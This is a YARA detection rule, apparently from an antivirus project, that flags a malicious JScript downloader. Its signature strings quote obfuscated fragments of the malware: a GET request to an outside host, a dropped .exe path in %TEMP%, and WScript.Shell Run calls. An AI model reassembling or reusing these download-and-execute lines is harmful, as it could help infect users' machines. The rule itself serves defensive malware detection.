rule sig_20160328_73d7d50bead48b313b4f5361d036b15b {
  meta:
    description = "datamaliciousorder - file 20160328_73d7d50bead48b313b4f5361d036b15b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aab412986527c610adaf284bce9961d5f7fb387ec9e29e90c6694bed66ebce03"

  strings:
    $s1  = "function Tbvcrbs() {return Agduzxdtsr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"IvgIhTkT.exe\";};" fullword ascii
    $s2  = "Syiqffbsag[Arwuqyizq](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Nmobhjyoby](Ylqzbb() * 11)} while (Syiqffbsag[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dxgwyv(Imdntih, Auxkyzaxg){return Imdntih - Auxkyzaxg;};" fullword ascii
    $s5  = "var Agduzxdtsr = function Hjycawwa() {return WScript[Nbqqplmrid](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xcqsaxe(Mlhatynps){Agduzxdtsr[\"Run\"](Mlhatynps, Rgbibbm, Rgbibbm);};" fullword ascii
    $s7  = "function Hsrzmfoobd() {return ((Isowjujah == true) && (Isowjujah == Xkthyyebrx)) ? 1 : Rgbibbm;};" fullword ascii
    $s8  = "var Xmexcb = false;" fullword ascii
    $s9  = "var Mtmao = new this[\"Date\"]();" fullword ascii
    $s10 = " while (Zmhre){" fullword ascii
    $s11 = "var Isowjujah = false;" fullword ascii
    $s12 = "return Dxgwyv(Akjvbdqq, Vfhbb);" fullword ascii
    $s13 = "function Kdnrglw()" fullword ascii
    $s14 = "function Ylqzbb(){return 22;};" fullword ascii
    $s15 = "function Utgdzwl(){return Nbqqplmrid;};" fullword ascii
    $s16 = "var Xkthyyebrx = false;" fullword ascii
    $s17 = "Isowjujah = true; " fullword ascii
    $s18 = "function Kcgec(){return Tzjsest;};" fullword ascii
    $s19 = "Xkthyyebrx = true; " fullword ascii
    $s20 = "} catch(Wwukwfo){Zmhre = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}